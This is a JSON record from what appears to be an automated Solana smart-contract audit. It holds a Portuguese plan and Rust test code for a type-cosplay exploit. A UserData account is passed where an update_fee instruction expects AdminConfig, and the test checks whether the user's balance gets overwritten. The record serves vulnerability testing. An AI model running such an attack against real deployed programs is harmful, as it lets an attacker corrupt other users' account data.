{"plan": "Preparo uma conta AdminConfig legitima com admin = authority e fee_basis_points = 100, e uma conta UserData com o mesmo layout (authority, balance) cujo primeiro campo e a authority. O baseline chama update_fee com a conta AdminConfig correta e deve ter sucesso. O ataque substitui a conta config por uma conta UserData (discriminador diferente) mantendo a mesma authority signer, testando se o programa aceita o tipo errado. O efeito medido e que a conta UserData teve seu campo balance sobrescrito com o novo fee, provando o cosplay.", "scenario": "let authority = Pubkey::new_unique();
let config_key = Pubkey::new_unique();
let user_key = Pubkey::new_unique();

let config_data = anchor_account_data("AdminConfig", &(authority, 100u64));
let user_data = anchor_account_data("UserData", &(authority, 500u64));

let config_account = account(&env.program_id, &config_data, None);
let user_account = account(&env.program_id, &user_data, None);
let authority_account = wallet(1_000_000_000);

let metas = vec![
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(authority, true),
];
let ix = env.anchor_ix("update_fee", &(777u64,), metas);
let contas = vec![
    (config_key, config_account.clone()),
    (authority, authority_account.clone()),
];
let r = env.baseline("update_fee legitimo", &ix, &contas);

let metas_attack = vec![
    AccountMeta::new(user_key, false),
    AccountMeta::new_readonly(authority, true),
];
let ix_attack = env.anchor_ix("update_fee", &(777u64,), metas_attack);
let contas_attack = vec![
    (user_key, user_account.clone()),
    (authority, authority_account.clone()),
];
let ra = env.attack("cosplay: UserData no lugar de AdminConfig", &ix_attack, &contas_attack);

if ra.program_result == ProgramResult::Success {
    let data = after(&ra, &user_key).data();
    env.effect("balance da UserData sobrescrito com o novo fee", read_u64(data, 40) == 777u64);
}"}

